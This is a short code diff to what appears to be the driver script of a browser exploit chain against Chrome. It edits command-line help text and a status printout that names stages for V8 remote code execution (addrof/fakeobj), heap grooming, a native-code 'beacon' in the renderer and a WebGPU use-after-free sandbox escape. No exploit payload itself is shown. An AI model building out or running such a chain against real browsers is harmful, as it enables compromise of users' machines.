@@ -417,7 +417,7 @@ def main():
     parser.add_argument("--no-sandbox", action="store_true",
                         help="Disable Chrome sandbox (test mode only)")
     parser.add_argument("--stage", type=int, default=0,
-                        help="Start from stage N (0=full chain)")
+                        help="Skip stages below N (0=full chain, WARNING: skipping may cause missing variables)")
     parser.add_argument("--max-attempts", type=int, default=3,
                         help="Max Dawn UAF trigger attempts (default: 3)")
     args = parser.parse_args()
@@ -809,7 +809,7 @@ def main():
     print(f"\n{'='*72}")
     print("[*] EXPLOIT CHAIN STATUS:")
     print(f"    Stage 1 (V8 RCE):       CVE-2026-6307 FrameState CSE addrof/fakeobj")
-    print(f"    Stage 2 (Heap layout):   Renderer PID {renderer_pid if 'renderer_pid' in dir() else '?'}")
+    print(f"    Stage 2 (Heap layout):   Renderer PID {renderer_pid if 'renderer_pid' in locals() else '?'}")
     print(f"    Stage 3 (Beacon):        Native code exec in renderer")
     print(f"    Stage 4 (WebGPU):        Adapter available")
     print(f"    Stage 5 (Dawn UAF):      CVE-2026-5281 sandbox escape trigger")
